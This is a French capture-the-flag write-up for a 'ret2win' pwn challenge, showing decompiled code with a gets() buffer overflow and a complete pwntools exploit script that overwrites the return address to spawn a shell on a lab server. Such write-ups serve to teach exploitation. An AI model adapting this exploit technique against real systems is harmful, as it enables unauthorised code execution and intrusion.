# 💻 Unreachable Code

### 🛠 Type : `Pwn`

## 📝 Description

On nous fournit un binaire ELF 64 bits non strippé :

```bash
└─[$] <> file unreachable_code            
unreachable_code: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e3bcec212a4c6e6d590a6419fd7ecc53b3d624da, for GNU/Linux 3.2.0, not stripped
```

## 🔎 Analyse statique (Ghidra)

### Fonction `main` :

```c
undefined8 main(void) {
  printf("Enter your string: ");
  fflush(stdout);
  vuln();
  return 0;
}
```

→ La fonction `main` appelle simplement `vuln()`.

---

### Fonction `vuln` :

```c
void vuln(void) {
  char local_28 [32];
  gets(local_28);
  printf("You entered: %s\n", local_28);
  return;
}
```

🛑 ⚠️ Elle utilise `gets()` sur un buffer de 32 octets, ce qui introduit une **vulnérabilité de dépassement de tampon** (`buffer overflow`). Cela permet d’écraser le pointeur de retour de la fonction.

---

### Fonction `ret2win` :

```c
void ret2win(void) {
  execve("/bin/sh", (char **)0x0, (char **)0x0);
  return;
}
```

→ Cette fonction n'est **jamais appelée** dans le flot normal du programme. Mais si on **redirige l’exécution** vers elle, on obtient un shell !

## 🧪 Exploitation (ret2win)

Le but est donc de provoquer un **buffer overflow** pour sauter à l’adresse de `ret2win`.

### 💥 Calcul du `padding`

* Le buffer est de 32 octets
* Le pointeur de base (`RBP`) est de 8 octets
* Il faut donc **40 octets de padding** pour atteindre l'adresse de retour

---

### 🐍 Exploit (Python + pwntools)

```python
#!/usr/bin/env python3
from pwn import *
import sys

binary_path = "./unreachable_code"
remote_host = "unreachable.labossi.xyz"
remote_port = 32952

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    p = remote(remote_host, remote_port)
    log.info("Connexion à la cible distante: %s:%d", remote_host, remote_port)
else:
    p = process(binary_path)
    log.info("Exécution en local: %s", binary_path)

context.binary = binary_path
context.log_level = 'info'

# Récupération de l'adresse de ret2win
elf = ELF(binary_path)
ret2win_addr = elf.symbols['ret2win']
log.info("Adresse de ret2win: 0x%x", ret2win_addr)

# Construction du payload
padding_size = 40
payload = b'A' * padding_size + p64(ret2win_addr)

p.recvuntil(b"Enter your string: ")
p.sendline(payload)
p.interactive()
```

## ✅ Résultat

Une fois le shell obtenu, il suffit de cat le fichier:

```bash
cat flag.txt
```

## 🏁 Flag

```
RETRO{...} (flag perdu, serveur down)
```
